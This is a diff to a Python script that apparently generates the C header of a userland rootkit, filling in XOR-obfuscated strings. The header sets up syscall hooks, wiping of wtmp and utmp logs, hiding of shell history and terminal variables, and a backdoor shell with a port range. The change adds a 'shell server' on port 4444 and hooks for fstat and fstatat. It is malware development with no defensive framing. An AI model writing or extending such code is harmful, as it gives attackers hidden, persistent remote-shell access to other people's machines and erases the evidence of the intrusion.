@@ -32,16 +32,19 @@ header_template = '''#define _GNU_SOURCE
 #define CLEANUP_LOGS\t"{cleanup_logs}"
 #define WTMP_FILE_X\t"{wtmp_file}"
 #define UTMP_FILE_X\t"{utmp_file}"
+#define SYS_WRITE\t"{sys_write}"
+#define SYS_READ\t"{sys_read}"
+
 #define SHELL_TYPE\t"{shell_type}"
+#define SHELL_MSG\t"{shell_msg}"
+#define SHELL_SERVER\t"{shell_server}"
 #define HIDE_TERM_VAR\t"{hide_term_var}"
 #define HIST_FILE\t"{hist_file}"
 #define TERM\t"{term}"
-#define SYS_WRITE\t"{sys_write}"
-#define SYS_READ\t"{sys_read}"
-#define SHELL_MSG\t"{shell_msg}"
 
 #define MAX_LEN 1024
 
+#define SHELL_SERVER_PORT\t{shell_server_port}
 #define LOW_PORT\t{low_port}
 #define HIGH_PORT\t{high_port}
 
@@ -63,8 +66,10 @@ header_template = '''#define _GNU_SOURCE
 #define SYS_MKDIRAT 12
 #define SYS_EXECVE 13
 #define SYS_ACCEPT 14
+#define SYS_FXSTAT 15
+#define SYS_FXSTATAT 16
 
-#define SYSCALL_SIZE 15
+#define SYSCALL_SIZE 17
 
 static char *syscall_table[SYSCALL_SIZE] = {{
 '''
@@ -84,7 +89,9 @@ syscalls = [
     "mkdir",
     "mkdirat",
     "execve",
-    "accept"
+    "accept",
+    "fstat",
+    "fstatat",
 ]
 
 header = header_template.format(
@@ -108,6 +115,8 @@ header = header_template.format(
     shell_msg=xor("Welcome to the shell!\n"),
     low_port=61041,
     high_port=61051,
+    shell_server=xor("shellserver"),
+    shell_server_port=4444
 )
 
 # XOR the syscall names and format them into a list
